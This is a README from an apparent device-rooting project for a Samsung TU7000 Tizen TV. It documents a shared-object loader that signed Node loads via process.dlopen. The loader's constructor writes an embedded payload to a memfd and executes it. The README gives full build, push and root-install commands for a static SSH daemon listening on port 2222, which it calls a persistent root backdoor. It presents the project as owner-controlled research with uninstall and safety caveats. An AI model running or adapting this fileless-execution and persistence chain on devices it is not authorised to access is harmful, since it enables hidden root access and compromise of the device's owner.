# TU7000 Node-loaded memfd payloads

Status: host-tested; TV gate pending.

The target has no `sshd`, Dropbear, `sftp-server`, Python, Perl, `busybox`,
`nc`, or `socat`. It does have signed Node 4.4.3 (ARM soft-float, ABI 46,
glibc 2.24) with `process.dlopen`.

This directory contains the execution rail for a future persistent service:

- `probe/probe.c`: a static ARM payload that writes a file marker.
- `loader.c`: a dependency-free ARM soft-float shared object. Its
  `.init_array` constructor writes an embedded payload to a `memfd` and
  executes it with `execveat` (falling back to `/proc/self/fd/N`).
- `build.py`: builds the probe and embeds a payload in the loader.

The loader is loaded by signed Node with `process.dlopen`. It does not change
UEP, SMACK, firmware, or any reviewed system file.

## Why the probe writes a file

Node marks its stdio descriptors close-on-exec. An exec'd payload cannot rely
on stdout or stderr, even though the exec itself succeeds. The probe therefore
writes `/tmp/tizenpwn-memfd-ok`; the host reads that file through SDB.

## Build

```console
# Zig is required. Use an explicit path if the mise shim is not configured.
ZIG=/path/to/zig

python3 build.py probe \
  --zig "$ZIG" \
  --output /tmp/tizenpwn-probe

python3 build.py loader \
  --zig "$ZIG" \
  --payload /tmp/tizenpwn-probe \
  --output /tmp/libtizenpwn-probe.so \
  --name tizenpwn-probe \
  --error-file /tmp/tizenpwn-loader-error
```

The loader target defaults to `arm-linux-gnueabi.2.24` (ARM soft-float, glibc
2.24). The probe target defaults to `arm-linux-musleabi` (static).

The build helper rejects a hard-float loader, a loader with a shared-library
dependency, or a loader without `.init_array`.

Build both final artifacts and their loaders with:

```console
ZIG=/path/to/zig ./build_all.sh /tmp/tizenpwn-build
```

This also builds the static ARM Go daemon and writes `SHA256SUMS` in the output
directory. The host-only rail check is:

```console
ZIG=/path/to/zig ./test_loader_host.sh
```

It builds an x86-64 probe and loader, loads the loader through the host Node,
and verifies `TIZENPWN_MEMFD_OK` in a marker file.

## Host test of the rail

The rail can be tested without the TV by building an x86-64 probe and loader
and loading the loader with Node:

```console
python3 build.py probe --zig "$ZIG" \
  --target x86_64-linux-musl \
  --output /tmp/tizenpwn-probe-host
python3 build.py loader --zig "$ZIG" \
  --payload /tmp/tizenpwn-probe-host \
  --output /tmp/libtizenpwn-probe-host.so \
  --name tizenpwn-probe \
  --target x86_64-linux-gnu \
  --error-file /tmp/tizenpwn-loader-error

rm -f /tmp/tizenpwn-memfd-ok
node -e 'try{process.dlopen({exports:{}},"/tmp/libtizenpwn-probe-host.so")}catch(e){console.error(e.message)}'
cat /tmp/tizenpwn-memfd-ok
```

The expected output is `TIZENPWN_MEMFD_OK`.

## Live probe gate

1. Build the ARM probe loader above.
2. Push it to the TV with SDB:

   ```console
   sdb -s "$TV_IP:26101" push \
     /tmp/libtizenpwn-probe.so \
     /home/owner/share/tmp/sdk_tools/tizenpwn-probe.so
   ```

3. Run one reviewed root one-shot. It copies the loader to `/opt`, loads it
   through Node, reads the marker, and removes the gate files:

   ```console
   READY='mkdir -p /opt/tizenpwn-gate
   cp /home/owner/share/tmp/sdk_tools/tizenpwn-probe.so /opt/tizenpwn-gate/loader.so
   chmod 0755 /opt/tizenpwn-gate/loader.so
   rm -f /tmp/tizenpwn-memfd-ok /tmp/tizenpwn-loader-error
   node -e "try{process.dlopen({exports:{}},\"/opt/tizenpwn-gate/loader.so\")}catch(e){console.error(e.message)}"
   cat /tmp/tizenpwn-memfd-ok
   cat /tmp/tizenpwn-loader-error 2>/dev/null || true
   ls -l /opt/tizenpwn-gate/loader.so
   rm -rf /opt/tizenpwn-gate /tmp/tizenpwn-memfd-ok /tmp/tizenpwn-loader-error'
   uv run tizenpwn cifs command "$TV_IP" \
     --confirm TU7000-T-KTSU2AKUC-2743.0 \
     --accept-saved-profile \
     --command "$READY"
   ```

   The command needs the usual two manual Remote PC/Shared Folder gates. A
   successful run prints `TIZENPWN_MEMFD_OK` in the command results. If it
   prints nothing, exits 127, or writes an error file, stop and inspect. Do not
   disable UEP or SMACK.

## Server gate

Once the probe passes, embed the static Go SSH daemon instead of the probe:

```console
cd ../sshd
CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 \
  go build -trimpath -ldflags='-s -w' -o /tmp/tizenpwn-sshd-arm .

cd ../persistence
python3 build.py loader \
  --zig "$ZIG" \
  --payload /tmp/tizenpwn-sshd-arm \
  --output /tmp/libtizenpwn-sshd.so \
  --name sshd \
  --error-file /opt/tizenpwn-ssh/var/loader-error
```

The daemon uses these defaults:

- listen `0.0.0.0:2222`
- host key `/opt/tizenpwn-ssh/etc/ssh_host_ed25519_key`
- authorized keys `/opt/tizenpwn-ssh/etc/authorized_keys`
- log `/opt/tizenpwn-ssh/var/sshd.log`
- pid file `/opt/tizenpwn-ssh/var/sshd.pid`

Stage the loader, an Ed25519 host key, and the caller's public key. Push them
to `sdk_tools`, then run a root one-shot that installs and starts the service:

```console
SERVICE='mkdir -p /opt/tizenpwn-ssh/etc /opt/tizenpwn-ssh/var
cp /home/owner/share/tmp/sdk_tools/libtizenpwn-sshd.so /opt/tizenpwn-ssh/libtizenpwn.so
cp /home/owner/share/tmp/sdk_tools/tizenpwn_host_key /opt/tizenpwn-ssh/etc/ssh_host_ed25519_key
cp /home/owner/share/tmp/sdk_tools/tizenpwn_authorized_keys /opt/tizenpwn-ssh/etc/authorized_keys
chmod 700 /opt/tizenpwn-ssh /opt/tizenpwn-ssh/etc /opt/tizenpwn-ssh/var
chmod 600 /opt/tizenpwn-ssh/etc/ssh_host_ed25519_key /opt/tizenpwn-ssh/etc/authorized_keys
chown -R root:root /opt/tizenpwn-ssh
rm -f /opt/tizenpwn-ssh/var/loader-error
setsid node -e "try{process.dlopen({exports:{}},\"/opt/tizenpwn-ssh/libtizenpwn.so\")}catch(e){console.error(e.message)}" >/dev/null 2>&1 &
sleep 2
cat /opt/tizenpwn-ssh/var/sshd.log
cat /opt/tizenpwn-ssh/var/sshd.pid
cat /opt/tizenpwn-ssh/var/loader-error 2>/dev/null || true'
uv run tizenpwn cifs command "$TV_IP" \
  --confirm TU7000-T-KTSU2AKUC-2743.0 \
  --accept-saved-profile \
  --command "$SERVICE"
```

The command needs the usual two manual Remote PC/Shared Folder gates. Then
verify from the controller:

```console
ssh -i ~/.ssh/tizenpwn_tv -p 2222 \
  -o IdentitiesOnly=yes \
  -o StrictHostKeyChecking=yes \
  root@"$TV_IP" 'id; uname -a'

sftp -i ~/.ssh/tizenpwn_tv -P 2222 root@"$TV_IP"
scp -i ~/.ssh/tizenpwn_tv -P 2222 local-file root@"$TV_IP":/tmp/
```

Use `scp -O` if a client insists on the legacy protocol. Stop the gate with:

```console
kill "$(cat /opt/tizenpwn-ssh/var/sshd.pid)"
rm -rf /opt/tizenpwn-ssh
```

Run the cleanup through an SSH session if it is working, or through another
reviewed root one-shot if it is not.

## Limits

- `/` is read-only and `/opt` has roughly 300 MB free. Do not put large files
  in `/opt` beyond the loader and logs.
- The loader is soft-float because Node is soft-float. The embedded Go binary
  is static and uses its own ABI.
- Node 4.4.3 is old and no longer maintained. It is used only as a signed
  loader host; the network-facing server is the Go binary.
- This is a persistent root backdoor. Use a dedicated key, a trusted LAN, and
  the uninstall path. Do not expose port 2222 to the Internet.

## Licensing

The loader, probe, and build helper are part of this repository (Unlicense).
The Go daemon and its vendored dependencies are described in
`../sshd/README.md`.
